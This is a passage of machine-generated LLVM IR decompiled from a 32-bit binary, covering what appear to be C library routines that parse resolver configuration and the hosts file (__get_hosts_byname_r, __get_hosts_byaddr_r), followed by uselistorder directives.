  %v6_8065ef067 = phi i32 [ %v6_8065ef062, %dec_label_pc_8065ef6.lr.ph ], [ %v6_8065ef0, %dec_label_pc_8065eef ]
  %v2_8065ef066 = phi i8 [ %v2_8065ef059, %dec_label_pc_8065ef6.lr.ph ], [ %v2_8065ef0, %dec_label_pc_8065eef ]
  %v0_8065eef65 = phi i32 [ %v0_8065ef0.pre, %dec_label_pc_8065ef6.lr.ph ], [ %v1_8065eef, %dec_label_pc_8065eef ]
  store i32 %v0_8065ef6.pre, i32* @eax, align 4
  %v2_8065efb = sext i8 %v2_8065ef066 to i32
  store i32 %v2_8065efb, i32* @edx, align 4
  %v2_8065efe = mul nsw i32 %v2_8065efb, 2
  %v3_8065efe = add i32 %v0_8065ef6.pre, %v2_8065efe
  %v4_8065efe = inttoptr i32 %v3_8065efe to i8*
  %v5_8065efe = load i8, i8* %v4_8065efe, align 1
  %v6_8065efe = and i8 %v5_8065efe, 32
  %v7_8065efe = icmp eq i8 %v6_8065efe, 0
  %v1_8065f02 = icmp eq i1 %v7_8065efe, false
  br i1 %v1_8065f02, label %dec_label_pc_8065f0f.preheader, label %dec_label_pc_8065f04

dec_label_pc_8065f04:                             ; preds = %dec_label_pc_8065ef6
  %v10_8065f04 = icmp eq i8 %v2_8065ef066, 10
  %v1_8065f07 = icmp eq i1 %v10_8065f04, false
  br i1 %v1_8065f07, label %dec_label_pc_8065eef, label %dec_label_pc_8065f0f.preheader

dec_label_pc_8065f0f.preheader:                   ; preds = %dec_label_pc_8065f04, %dec_label_pc_8065ef6, %dec_label_pc_8065eef, %dec_label_pc_8065ee2
  %v0_8065eef.lcssa = phi i32 [ %v0_8065ef0.pre, %dec_label_pc_8065ee2 ], [ %v1_8065eef, %dec_label_pc_8065eef ], [ %v0_8065eef65, %dec_label_pc_8065ef6 ], [ %v0_8065eef65, %dec_label_pc_8065f04 ]
  %v6_8065ef0.lcssa = phi i32 [ %v6_8065ef062, %dec_label_pc_8065ee2 ], [ %v6_8065ef0, %dec_label_pc_8065eef ], [ %v6_8065ef067, %dec_label_pc_8065ef6 ], [ %v6_8065ef067, %dec_label_pc_8065f04 ]
  %v1_8065f0f73 = inttoptr i32 %v0_8065eef.lcssa to i8*
  %v2_8065f0f74 = load i8, i8* %v1_8065f0f73, align 1
  %v3_8065f0f75 = zext i8 %v2_8065f0f74 to i32
  %v5_8065f0f76 = and i32 %v6_8065ef0.lcssa, -256
  %v6_8065f0f77 = or i32 %v3_8065f0f75, %v5_8065f0f76
  store i32 %v6_8065f0f77, i32* @ecx, align 4
  %v4_8065f1178 = icmp eq i8 %v2_8065f0f74, 0
  br i1 %v4_8065f1178, label %dec_label_pc_8065f28, label %dec_label_pc_8065f15

dec_label_pc_8065f0b:                             ; preds = %dec_label_pc_8065f23, %dec_label_pc_8065f15
  store i8 0, i8* %v1_8065f0f81, align 1
  %v0_8065f0e = load i32, i32* @ebx, align 4
  %v1_8065f0e = add i32 %v0_8065f0e, 1
  store i32 %v1_8065f0e, i32* @ebx, align 4
  %v4_8065f0f.pre = load i32, i32* @ecx, align 4
  %v1_8065f0f = inttoptr i32 %v1_8065f0e to i8*
  %v2_8065f0f = load i8, i8* %v1_8065f0f, align 1
  %v3_8065f0f = zext i8 %v2_8065f0f to i32
  %v5_8065f0f = and i32 %v4_8065f0f.pre, -256
  %v6_8065f0f = or i32 %v3_8065f0f, %v5_8065f0f
  store i32 %v6_8065f0f, i32* @ecx, align 4
  %v4_8065f11 = icmp eq i8 %v2_8065f0f, 0
  br i1 %v4_8065f11, label %dec_label_pc_8065f28, label %dec_label_pc_8065f15

dec_label_pc_8065f15:                             ; preds = %dec_label_pc_8065f0f.preheader, %dec_label_pc_8065f0b
  %v2_8065f0f82 = phi i8 [ %v2_8065f0f, %dec_label_pc_8065f0b ], [ %v2_8065f0f74, %dec_label_pc_8065f0f.preheader ]
  %v1_8065f0f81 = phi i8* [ %v1_8065f0f, %dec_label_pc_8065f0b ], [ %v1_8065f0f73, %dec_label_pc_8065f0f.preheader ]
  %v0_8065f2c80 = phi i32 [ %v1_8065f0e, %dec_label_pc_8065f0b ], [ %v0_8065eef.lcssa, %dec_label_pc_8065f0f.preheader ]
  %v0_8065f15 = load i32, i32* @global_var_8075640, align 64
  store i32 %v0_8065f15, i32* @eax, align 4
  %v2_8065f1a = sext i8 %v2_8065f0f82 to i32
  store i32 %v2_8065f1a, i32* @edx, align 4
  %v2_8065f1d = mul nsw i32 %v2_8065f1a, 2
  %v3_8065f1d = add i32 %v0_8065f15, %v2_8065f1d
  %v4_8065f1d = inttoptr i32 %v3_8065f1d to i8*
  %v5_8065f1d = load i8, i8* %v4_8065f1d, align 1
  %v6_8065f1d = and i8 %v5_8065f1d, 32
  %v7_8065f1d = icmp eq i8 %v6_8065f1d, 0
  %v1_8065f21 = icmp eq i1 %v7_8065f1d, false
  br i1 %v1_8065f21, label %dec_label_pc_8065f0b, label %dec_label_pc_8065f23

dec_label_pc_8065f23:                             ; preds = %dec_label_pc_8065f15
  %v10_8065f23 = icmp eq i8 %v2_8065f0f82, 10
  br i1 %v10_8065f23, label %dec_label_pc_8065f0b, label %dec_label_pc_8065f28

dec_label_pc_8065f28:                             ; preds = %dec_label_pc_8065f0b, %dec_label_pc_8065f23, %dec_label_pc_8065f0f.preheader
  %v0_8065f2c.lcssa = phi i32 [ %v0_8065eef.lcssa, %dec_label_pc_8065f0f.preheader ], [ %v0_8065f2c80, %dec_label_pc_8065f23 ], [ %v1_8065f0e, %dec_label_pc_8065f0b ]
  %v1_8065f0f.lcssa = phi i8* [ %v1_8065f0f73, %dec_label_pc_8065f0f.preheader ], [ %v1_8065f0f81, %dec_label_pc_8065f23 ], [ %v1_8065f0f, %dec_label_pc_8065f0b ]
  %v4_8065f28 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8065f2c = load i8, i8* %v1_8065f0f.lcssa, align 1
  %v3_8065f2c = icmp eq i8 %v2_8065f2c, 0
  br i1 %v3_8065f2c, label %dec_label_pc_8065f38, label %dec_label_pc_8065f31

dec_label_pc_8065f31:                             ; preds = %dec_label_pc_8065f2c.preheader, %dec_label_pc_8065f28
  %v0_8065ee6 = phi i32 [ %v0_8065f2c.lcssa, %dec_label_pc_8065f28 ], [ %v0_8065eae54, %dec_label_pc_8065f2c.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8065f28, %dec_label_pc_8065f28 ], [ 0, %dec_label_pc_8065f2c.preheader ]
  %v7_8065f36 = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_8065f36, label %dec_label_pc_8065f38, label %dec_label_pc_8065ee2

dec_label_pc_8065f38:                             ; preds = %dec_label_pc_8065f28, %dec_label_pc_8065f31, %dec_label_pc_8065f2c.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8065f2c.preheader ], [ %v4_8065f28, %dec_label_pc_8065f28 ], [ %stack_var_-196.011, %dec_label_pc_8065f31 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8065f3f = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_806f0c8.778 to i32), i32* %stack_var_-216, align 4
  %v4_8065f4c = call i32 @__GI_strcoll(i8* %v3_8065f4c, i32 ptrtoint ([11 x i8]* @global_var_806f0c8.778 to i32), i32 %v0_8065f3f)
  store i32 %v4_8065f4c, i32* @eax, align 4
  %v1_8065f54 = icmp eq i32 %v4_8065f4c, 0
  br i1 %v1_8065f54, label %dec_label_pc_8065f7c.preheader, label %dec_label_pc_8065f8d

dec_label_pc_8065f7c.preheader:                   ; preds = %dec_label_pc_8065f38
  %v0_8065f7c87 = load i32, i32* @esi, align 4
  %v5_8065f8096 = icmp slt i32 %v0_8065f7c87, %stack_var_-196.0.lcssa
  br i1 %v5_8065f8096, label %dec_label_pc_8065f82.lr.ph, label %dec_label_pc_8065f8d

dec_label_pc_8065f82.lr.ph:                       ; preds = %dec_label_pc_8065f7c.preheader
  %v0_8065f82.pre = load i32, i32* @global_var_807f840.675, align 64
  br label %dec_label_pc_8065f82

dec_label_pc_8065f5a:                             ; preds = %dec_label_pc_8065f82
  %v2_8065f5d = mul i32 %v0_8065f7c97, 4
  %v4_8065f5d = add i32 %v2_8065f5d, %v3_8065f5d
  %v5_8065f5d = inttoptr i32 %v4_8065f5d to i32*
  %v6_8065f5d = load i32, i32* %v5_8065f5d, align 4
  %v1_8065f64 = add i32 %v0_8065f7c97, 1
  store i32 %v1_8065f64, i32* @esi, align 4
  %v1_8065f65 = inttoptr i32 %v6_8065f5d to i8*
  %v2_8065f65 = call i32 @__GI_strdup(i8* %v1_8065f65)
  %v1_8065f6d = load i32, i32* @ebx, align 4
  %v2_8065f6d = mul i32 %v1_8065f6d, 4
  %v3_8065f6d = add i32 %v2_8065f6d, 134740020
  %v4_8065f6d = inttoptr i32 %v3_8065f6d to i32*
  store i32 %v2_8065f65, i32* %v4_8065f6d, align 4
  %v0_8065f74 = load i32, i32* @ebx, align 4
  %v1_8065f74 = add i32 %v0_8065f74, 1
  store i32 %v1_8065f74, i32* @eax, align 4
  store i32 %v1_8065f74, i32* @global_var_807f840.675, align 64
  %v0_8065f7c = load i32, i32* @esi, align 4
  %v5_8065f80 = icmp slt i32 %v0_8065f7c, %stack_var_-196.0.lcssa
  br i1 %v5_8065f80, label %dec_label_pc_8065f82, label %dec_label_pc_8065f8d

dec_label_pc_8065f82:                             ; preds = %dec_label_pc_8065f82.lr.ph, %dec_label_pc_8065f5a
  %v0_8065f82 = phi i32 [ %v0_8065f82.pre, %dec_label_pc_8065f82.lr.ph ], [ %v1_8065f74, %dec_label_pc_8065f5a ]
  %v0_8065f7c97 = phi i32 [ %v0_8065f7c87, %dec_label_pc_8065f82.lr.ph ], [ %v0_8065f7c, %dec_label_pc_8065f5a ]
  store i32 %v0_8065f82, i32* @ebx, align 4
  %v7_8065f8b = icmp sgt i32 %v0_8065f82, 2
  br i1 %v7_8065f8b, label %dec_label_pc_8065f8d, label %dec_label_pc_8065f5a

dec_label_pc_8065f8d:                             ; preds = %dec_label_pc_8065f7c.preheader, %dec_label_pc_8065f5a, %dec_label_pc_8065f82, %dec_label_pc_8065f38
  %v0_8065f8d = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806f0d3.779 to i32), i32* %stack_var_-216, align 4
  %v0_8065f94 = load i32, i32* @edi, align 4
  %v3_8065f95 = inttoptr i32 %v0_8065f94 to i8*
  %v4_8065f95 = call i32 @__GI_strcoll(i8* %v3_8065f95, i32 ptrtoint ([7 x i8]* @global_var_806f0d3.779 to i32), i32 %v0_8065f8d)
  store i32 %v4_8065f95, i32* @eax, align 4
  %v1_8065f9d = icmp eq i32 %v4_8065f95, 0
  br i1 %v1_8065f9d, label %dec_label_pc_8065fdf.preheader, label %dec_label_pc_8065fa1

dec_label_pc_8065fa1:                             ; preds = %dec_label_pc_8065f8d
  %v0_8065fa1 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806f0da.780 to i32), i32* %stack_var_-216, align 4
  %v0_8065fa8 = load i32, i32* @edi, align 4
  %v3_8065fa9 = inttoptr i32 %v0_8065fa8 to i8*
  %v4_8065fa9 = call i32 @__GI_strcoll(i8* %v3_8065fa9, i32 ptrtoint ([7 x i8]* @global_var_806f0da.780 to i32), i32 %v0_8065fa1)
  %v1_8065fb1 = icmp eq i32 %v4_8065fa9, 0
  br i1 %v1_8065fb1, label %dec_label_pc_8065fdf.preheader, label %dec_label_pc_8066022

dec_label_pc_8065fdf.preheader:                   ; preds = %dec_label_pc_8065f8d, %dec_label_pc_8065fa1
  %v0_8065fdf98 = load i32, i32* @global_var_807f844.774, align 4
  %tmp41101 = icmp slt i32 %v0_8065fdf98, 1
  %tmp42102 = icmp eq i1 %tmp41101, false
  br i1 %tmp42102, label %dec_label_pc_8065fb7, label %dec_label_pc_8065fe8

dec_label_pc_8065fb7:                             ; preds = %dec_label_pc_8065fdf.preheader, %dec_label_pc_8065fb7.dec_label_pc_8065fb7_crit_edge
  %v0_8065fdf103 = phi i32 [ %v0_8065fdf, %dec_label_pc_8065fb7.dec_label_pc_8065fb7_crit_edge ], [ %v0_8065fdf98, %dec_label_pc_8065fdf.preheader ]
  %v1_8065fb7 = add i32 %v0_8065fdf103, -1
  %v1_8065fbb = mul i32 %v1_8065fb7, 4
  %v2_8065fbb = add i32 %v1_8065fbb, 134740004
  %v3_8065fbb = inttoptr i32 %v2_8065fbb to i32*
  %v4_8065fbb = load i32, i32* %v3_8065fbb, align 4
  store i32 %v1_8065fb7, i32* @global_var_807f844.774, align 4
  %v1_8065fc7 = call i32 @free(i32 %v4_8065fbb)
  %v0_8065fcc = load i32, i32* @global_var_807f844.774, align 4
  %v1_8065fd4 = mul i32 %v0_8065fcc, 4
  %v2_8065fd4 = add i32 %v1_8065fd4, ptrtoint (i32* @global_var_807f824.781 to i32)
  %v3_8065fd4 = inttoptr i32 %v2_8065fd4 to i32*
  store i32 0, i32* %v3_8065fd4, align 4
  %v0_8065fdf = load i32, i32* @global_var_807f844.774, align 4
  %tmp41 = icmp slt i32 %v0_8065fdf, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8065fb7.dec_label_pc_8065fb7_crit_edge, label %dec_label_pc_8065fe8

dec_label_pc_8065fb7.dec_label_pc_8065fb7_crit_edge: ; preds = %dec_label_pc_8065fb7
  br label %dec_label_pc_8065fb7

dec_label_pc_8065fe8:                             ; preds = %dec_label_pc_8065fb7, %dec_label_pc_8065fdf.preheader
  %v0_8065fdf.lcssa = phi i32 [ %v0_8065fdf98, %dec_label_pc_8065fdf.preheader ], [ %v0_8065fdf, %dec_label_pc_8065fb7 ]
  store i32 1, i32* @esi, align 4
  %v5_8066015113 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8066015113, label %dec_label_pc_8066017, label %dec_label_pc_8066022

dec_label_pc_8065fef:                             ; preds = %dec_label_pc_8066017
  %v2_8065ff2 = mul i32 %v0_8065ff9115, 4
  %v4_8065ff2 = add i32 %v2_8065ff2, %v3_8065f5d
  %v5_8065ff2 = inttoptr i32 %v4_8065ff2 to i32*
  %v6_8065ff2 = load i32, i32* %v5_8065ff2, align 4
  %v1_8065ff9 = add i32 %v0_8065ff9115, 1
  store i32 %v1_8065ff9, i32* @esi, align 4
  %v1_8065ffa = inttoptr i32 %v6_8065ff2 to i8*
  %v2_8065ffa = call i32 @__GI_strdup(i8* %v1_8065ffa)
  %v1_8066002 = load i32, i32* @ebx, align 4
  %v2_8066002 = mul i32 %v1_8066002, 4
  %v3_8066002 = add i32 %v2_8066002, 134740004
  %v4_8066002 = inttoptr i32 %v3_8066002 to i32*
  store i32 %v2_8065ffa, i32* %v4_8066002, align 4
  %v0_8066009 = load i32, i32* @ebx, align 4
  %v1_8066009 = add i32 %v0_8066009, 1
  store i32 %v1_8066009, i32* @global_var_807f844.774, align 4
  %v0_8066011.pre = load i32, i32* @esi, align 4
  %v5_8066015 = icmp slt i32 %v0_8066011.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8066015, label %dec_label_pc_8066017, label %dec_label_pc_8066022

dec_label_pc_8066017:                             ; preds = %dec_label_pc_8065fe8, %dec_label_pc_8065fef
  %v0_8065ff9115 = phi i32 [ %v0_8066011.pre, %dec_label_pc_8065fef ], [ 1, %dec_label_pc_8065fe8 ]
  %v0_8066017114 = phi i32 [ %v1_8066009, %dec_label_pc_8065fef ], [ %v0_8065fdf.lcssa, %dec_label_pc_8065fe8 ]
  store i32 %v0_8066017114, i32* @ebx, align 4
  %v7_8066020 = icmp sgt i32 %v0_8066017114, 3
  br i1 %v7_8066020, label %dec_label_pc_8066022, label %dec_label_pc_8065fef

dec_label_pc_8066022:                             ; preds = %dec_label_pc_8065eaf.preheader, %dec_label_pc_8065eae, %dec_label_pc_8065fe8, %dec_label_pc_8066017, %dec_label_pc_8065fef, %dec_label_pc_8065fa1, %dec_label_pc_8065ed0, %dec_label_pc_8065ec7, %dec_label_pc_8066022.preheader
  %v0_8066022 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8066029, i32* @ebx, align 4
  %v3_806602e = call i32 @fgets(i32 %v2_8066029, i32 128, i32 %v0_8066022)
  %v1_8066036 = icmp eq i32 %v3_806602e, 0
  %v1_8066038 = icmp eq i1 %v1_8066036, false
  br i1 %v1_8066038, label %dec_label_pc_8065eaf.preheader, label %dec_label_pc_806603e

dec_label_pc_8065eaf.preheader:                   ; preds = %dec_label_pc_8066022
  %v0_8065eaf.pre = load i32, i32* @ebx, align 4
  %v4_8065eaf.pre = load i32, i32* @ecx, align 4
  %v1_8065eaf47 = inttoptr i32 %v0_8065eaf.pre to i8*
  %v2_8065eaf48 = load i8, i8* %v1_8065eaf47, align 1
  %v3_8065eaf49 = zext i8 %v2_8065eaf48 to i32
  %v5_8065eaf50 = and i32 %v4_8065eaf.pre, -256
  %v6_8065eaf51 = or i32 %v3_8065eaf49, %v5_8065eaf50
  store i32 %v6_8065eaf51, i32* @ecx, align 4
  %v4_8065eb152 = icmp eq i8 %v2_8065eaf48, 0
  br i1 %v4_8065eb152, label %dec_label_pc_8066022, label %dec_label_pc_8065eb9.lr.ph

dec_label_pc_8065eb9.lr.ph:                       ; preds = %dec_label_pc_8065eaf.preheader
  %v0_8065eb9.pre = load i32, i32* @global_var_8075640, align 64
  br label %dec_label_pc_8065eb9

dec_label_pc_806603e:                             ; preds = %dec_label_pc_8066022
  %v0_8066041 = load i32, i32* @ebp, align 4
  %v1_8066042 = inttoptr i32 %v0_8066041 to i16*
  %v2_8066042 = call i32 @__GI_fclose(i16* %v1_8066042)
  br label %dec_label_pc_8066057

dec_label_pc_806604c:                             ; preds = %dec_label_pc_8065e8b
  %v0_806604c = call i32 @__GI___h_errno_location()
  %v1_8066051 = inttoptr i32 %v0_806604c to i32*
  store i32 3, i32* %v1_8066051, align 4
  br label %dec_label_pc_8066057

dec_label_pc_8066057:                             ; preds = %entry, %dec_label_pc_806603e, %dec_label_pc_806604c
  store i32 1, i32* %stack_var_-216, align 4
  %v3_8066063 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_806606e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806606e, i32* @ebx, align 4
  store i32 %v0_8065e32, i32* @esi, align 4
  store i32 %v0_8065e31, i32* @edi, align 4
  store i32 %v0_8065e30, i32* @ebp, align 4
  ret i32 %v3_8066063

; uselistorder directives
  uselistorder i32 %v0_8065eb9.pre, { 1, 0 }
  uselistorder i32 %v6_8065eaf51, { 1, 0 }
  uselistorder i8 %v2_8065eaf48, { 1, 2, 0 }
  uselistorder i8* %v1_8065eaf47, { 1, 0 }
  uselistorder i32 %v0_8065eaf.pre, { 1, 0 }
  uselistorder i32 %v0_8065fdf, { 0, 2, 1 }
  uselistorder i32 %v0_8065f82, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8065f1a, { 1, 0 }
  uselistorder i32 %v2_8065efb, { 1, 0 }
  uselistorder i32 %v1_8065eef, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8065ebe, { 1, 0 }
  uselistorder i32 %v1_8065eae, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 128, { 15, 46, 5, 6, 16, 51, 53, 47, 0, 7, 8, 9, 10, 54, 55, 56, 57, 58, 4, 1, 11, 52, 12, 13, 14, 48, 2, 3, 49, 50, 17, 18, 27, 26, 28, 29, 19, 20, 31, 30, 32, 33, 21, 22, 35, 34, 36, 37, 23, 39, 38, 40, 41, 24, 25, 43, 42, 44, 45 }
  uselistorder i32* @global_var_807f844.774, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* @esp, { 563, 564, 565, 566, 567, 568, 20, 569, 570, 571, 572, 573, 26, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 22, 584, 585, 586, 23, 587, 19, 588, 589, 590, 591, 592, 593, 24, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 21, 607, 608, 609, 610, 611, 612, 25, 613, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 302, 2, 303, 304, 1, 0, 305, 306, 307, 27, 308, 309, 310, 29, 3, 311, 312, 313, 314, 315, 316, 317, 318, 319, 30, 28, 260, 261, 262, 263, 264, 31, 32, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 320, 637, 33, 638, 4, 5, 552, 6, 7, 8, 9, 10, 321, 34, 322, 323, 324, 325, 326, 327, 35, 614, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 36, 294, 295, 296, 37, 297, 298, 38, 299, 300, 301, 39, 639, 640, 641, 642, 40, 643, 644, 645, 646, 43, 647, 648, 649, 44, 650, 45, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 42, 664, 46, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 41, 677, 678, 679, 680, 685, 688, 686, 681, 328, 329, 330, 331, 332, 683, 684, 687, 682, 689, 333, 334, 54, 335, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 48, 47, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 87, 49, 80, 81, 82, 83, 84, 85, 50, 86, 18, 88, 89, 90, 91, 92, 336, 337, 51, 338, 339, 690, 340, 341, 342, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 187, 186, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 209, 208, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 343, 344, 345, 346, 347, 348, 349, 381, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 382, 383, 384, 385, 420, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 11, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 12, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 13, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 14, 519, 520, 521, 522, 523, 524, 525, 526, 528, 527, 529, 530, 531, 532, 15, 533, 534, 535, 537, 536, 538, 539, 540, 541, 16, 542, 543, 545, 544, 546, 547, 548, 549, 17, 550, 551, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 635, 636 }
  uselistorder i32 164, { 4, 0, 1, 2, 5, 3 }
  uselistorder i32* @global_var_807f840.675, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8075680.674 to i32), { 4, 0, 8, 9, 10, 11, 12, 13, 5, 14, 1, 6, 15, 2, 7, 16, 3 }
  uselistorder label %dec_label_pc_8066057, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066022, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8066017, { 1, 0 }
  uselistorder label %dec_label_pc_8065fb7, { 1, 0 }
  uselistorder label %dec_label_pc_8065fdf.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8065f8d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8065f82, { 1, 0 }
  uselistorder label %dec_label_pc_8065f38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8065f31, { 1, 0 }
  uselistorder label %dec_label_pc_8065f28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8065f15, { 1, 0 }
  uselistorder label %dec_label_pc_8065ef6, { 1, 0 }
  uselistorder label %dec_label_pc_8066022.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8066097 = inttoptr i32 %arg3 to i32*
  %v10_8066097 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8066097, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8066097
}

define i32 @__get_hosts_byaddr_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-54 = alloca i32, align 4
  %v0_80660a0 = load i32, i32* @esi, align 4
  %v0_80660a1 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v9_80660ad = icmp eq i32 %arg3, 2
  br i1 %v9_80660ad, label %dec_label_pc_80660b9, label %dec_label_pc_80660b2

dec_label_pc_80660b2:                             ; preds = %entry
  %v9_80660b2 = icmp eq i32 %arg3, 10
  %v1_80660b5 = icmp eq i1 %v9_80660b2, false
  br i1 %v1_80660b5, label %dec_label_pc_80660f9, label %dec_label_pc_80660be

dec_label_pc_80660b9:                             ; preds = %entry
  %v1_80660b9 = add i32 %arg2, -4
  br label %dec_label_pc_80660c1

dec_label_pc_80660be:                             ; preds = %dec_label_pc_80660b2
  %v1_80660be = add i32 %arg2, -16
  br label %dec_label_pc_80660c1

dec_label_pc_80660c1:                             ; preds = %dec_label_pc_80660b9, %dec_label_pc_80660be
  %storemerge2.in = phi i32 [ %v1_80660b9, %dec_label_pc_80660b9 ], [ %v1_80660be, %dec_label_pc_80660be ]
  %storemerge2 = icmp eq i32 %storemerge2.in, 0
  %v1_80660c1 = icmp eq i1 %storemerge2, false
  br i1 %v1_80660c1, label %dec_label_pc_80660f9, label %dec_label_pc_80660c3

dec_label_pc_80660c3:                             ; preds = %dec_label_pc_80660c1
  %v2_80660c5 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_80660c5, i32* @ebx, align 4
  %v4_80660cf = bitcast i32* %stack_var_-54 to i8*
  %v5_80660cf = call i32 @__GI_inet_ntop(i32 %arg3, i32 %arg1, i8* %v4_80660cf, i32 46)
  %v0_80660eb = load i32, i32* @esi, align 4
  %v9_80660ef = inttoptr i32 %arg4 to i32*
  %v10_80660ef = call i32 @__read_etc_hosts_r(i32 0, i32 %v2_80660c5, i32 %v0_80660eb, i32 2, i32* %v9_80660ef, i32 %arg5, i32 %arg6, i32 %arg7, i32 %tmp12)
  br label %dec_label_pc_80660fb

dec_label_pc_80660f9:                             ; preds = %dec_label_pc_80660c1, %dec_label_pc_80660b2
  br label %dec_label_pc_80660fb

dec_label_pc_80660fb:                             ; preds = %dec_label_pc_80660c3, %dec_label_pc_80660f9
  %v0_8066100 = phi i32 [ %v10_80660ef, %dec_label_pc_80660c3 ], [ 0, %dec_label_pc_80660f9 ]
  store i32 %v0_80660a1, i32* @ebx, align 4
  store i32 %v0_80660a0, i32* @esi, align 4
  ret i32 %v0_8066100

; uselistorder directives
  uselistorder i32 (i32, i32, i8*, i32)* @__GI_inet_ntop, { 1, 0 }
  uselistorder i32 -16, { 116, 68, 69, 70, 59, 61, 62, 58, 60, 35, 63, 57, 64, 65, 66, 67, 71, 54, 72, 36, 73, 132, 133, 75, 74, 76, 77, 55, 79, 80, 78, 37, 118, 81, 82, 119, 83, 84, 38, 134, 135, 85, 139, 140, 136, 117, 137, 0, 1, 43, 86, 56, 87, 88, 89, 120, 121, 41, 122, 42, 123, 124, 39, 125, 40, 126, 127, 90, 91, 44, 45, 128, 129, 46, 130, 131, 47, 96, 92, 48, 93, 94, 95, 97, 98, 49, 99, 100, 101, 138, 2, 3, 114, 112, 111, 109, 110, 51, 104, 52, 105, 53, 106, 103, 107, 108, 102, 50, 113, 115, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 6, 24, 25, 26, 7, 27, 8, 28, 29, 9, 30, 10, 31, 11, 32, 33, 34, 4 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
